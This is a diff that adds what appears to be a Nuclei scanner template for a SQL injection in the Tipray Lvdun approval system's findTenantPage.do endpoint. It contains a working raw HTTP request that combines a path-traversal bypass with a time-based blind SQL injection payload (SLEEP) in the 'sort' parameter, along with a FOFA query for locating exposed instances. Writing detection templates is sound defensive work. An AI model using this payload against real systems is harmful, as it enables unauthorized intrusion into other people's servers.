@@ -1,0 +1,41 @@
+id: tipray-gsas-findtenantpage-do-sqli
+info:
+  name: 天锐绿盾审批系统 findTenantPage.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 天锐绿盾审批系统
+    fofa: app="TIPPAY-绿盾审批系统"
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+2}}"
+
+http:
+  - raw:
+      - |
+        POST /trwfe/service/.%2E/invoker/findTenantPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        sort=(SELECT * FROM (SELECT(SLEEP({{t1}})))x)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"id":'
+          - '"name":'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
